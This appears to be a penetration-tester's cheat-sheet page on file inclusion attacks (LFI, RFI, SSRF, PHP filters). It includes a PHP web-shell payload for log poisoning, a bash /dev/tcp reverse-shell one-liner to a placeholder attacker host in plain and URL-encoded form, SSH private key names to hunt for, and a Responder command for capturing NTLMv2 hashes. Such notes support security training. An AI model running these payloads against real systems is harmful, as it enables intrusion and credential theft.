# File Inclusion/Upload

## LFI

LFI is when we can include a local file on the target.
This will often be insecure php servers where we are able to include unfortunate php files that are not meant to be executed.
If we can do log poisoning, this will for instance allow us to do something like writing this payload to a log:

```
<?php echo system($_GET['cmd']); ?>
```
and then calling the URL where the log is stored with the query param `cmd=$command`
If the log has been poisoned as is executed server side, the given command will be executed and shown in the response on the page.

The cmd could for instance be a bash one-liner for a reverse-shell:

```
bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
```

Which could be url-encoded as it contains special characters:

```
bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT%200%3E&1
```


When looking for private keys with LFI, remember to try all typical key formats:

* `id_rsa`
* `id_ed25519`
* `id_ecdsa` 


## RFI

RFI happens if we are able to refer a file on our attackbox which will be executed.
This could be a payload such as [the php payload](../payloads-n-scripts/reverse-shells/shell.php) exposed by a server on the attackbox. 

When you see a parameter or input field refering to "some URL", try to point it to your own web server and see if you get a directory listing.

## SSRF

Similar to RFI, SSRF is when we can get the web server to make an unintended request.
For windows servers, this can trick the server into including it's NTLMv2 hashes in it's request.

Setup a responder `sudo responder -I tun0 -A`, and point it at your server.
Remember to try both `http://` and `file://` as protocols.

## PHP Filters

Filters such as `filter://` and `data://` can be used for LFI to include files that would otherwise not have been included.
Sometimes this can either allow us to simply read the php files in the http responses, or we can even use it to execute them server side.






